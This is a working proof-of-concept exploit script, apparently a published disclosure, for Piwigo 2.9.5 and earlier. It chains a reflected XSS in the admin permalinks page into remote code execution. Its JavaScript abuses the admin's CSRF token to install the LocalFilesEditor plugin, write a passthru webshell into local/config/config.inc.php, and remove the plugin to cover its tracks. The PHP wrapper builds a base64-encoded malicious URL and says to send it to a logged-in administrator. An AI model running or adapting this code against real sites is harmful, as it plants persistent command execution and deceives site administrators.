<?php
////////////////////////////////////////////////////////////////////////////////
// Piwigo <= 2.9.5 XSS to RCE Proof of Concept 
// James Bercegay ( http://www.gulftech.org/ )
////////////////////////////////////////////////////////////////////////////////

// Start output buffering for JavaScript content
ob_start();
?>
// BEGIN JAVASCRIPT

// CSRF protection token
var pwg = document.forms[0].pwg_token.value;

// Webshell PHP code
var php = "passthru(urldecode($_REQUEST['x']));";

// LocalFilesEditor version info
var rev = "6861";
var ext = "144";

// Build URL
var url = "admin.php?page=plugins&tab=new&revision=" +
		   rev +
		  "&extension=" +
		  ext +
		  "&pwg_token=" + pwg;

// Install plugin
$.ajax({
    async: false,
    type: "GET",
    url: url
});

// Build URL
var url = "admin.php?page=plugins&plugin=LocalFilesEditor&pwg_token=" + 
		   pwg + 
		  "&action=activate";

// Activate plugin
$.ajax({
    async: false,
    type: "GET",
    url: url,
    success: function (response) {

    	// Build URL
		var url = "admin.php?page=plugin-LocalFilesEditor-localconf";

		// Keep space at the beginning of php payload. It's intentional.
		$.post( url, { pwg_token: pwg, text: " " + php, submit: "1" } );

}});

// Build URL
var url = "admin.php?page=plugins&plugin=LocalFilesEditor&pwg_token=" + 
		   pwg + 
		  "&action=deactivate";

// De Activate plugin
$.ajax({
    async: false,
    type: "GET",
    url: url
});

// Build URL
var url = "admin.php?page=plugins&plugin=LocalFilesEditor&pwg_token=" +
		   pwg + 
		  "&action=delete";

// Uninstall plugin 
$.ajax({
    async: false,
    type: "GET",
    url: url
});

// Redirect user
document.location = "admin.php";

// ENDED JAVASCRIPT
<?php

// Encode contents using base64 encoding. We do this because PHP strips certain 
// characters from key values, and will prevent loading javascript containing a 
// dot for example.
$b64 = base64_encode(ob_get_clean());

// Formatted URL
$url = '/admin.php?page=permalinks&"><script>eval(atob("%s"));</script><a+"=1';

// Output
printf($url, urlencode($b64));
printf("\nSend the above URL to a logged in administrator.");
printf("\nShell will be located at: local/config/config.inc.php");
?>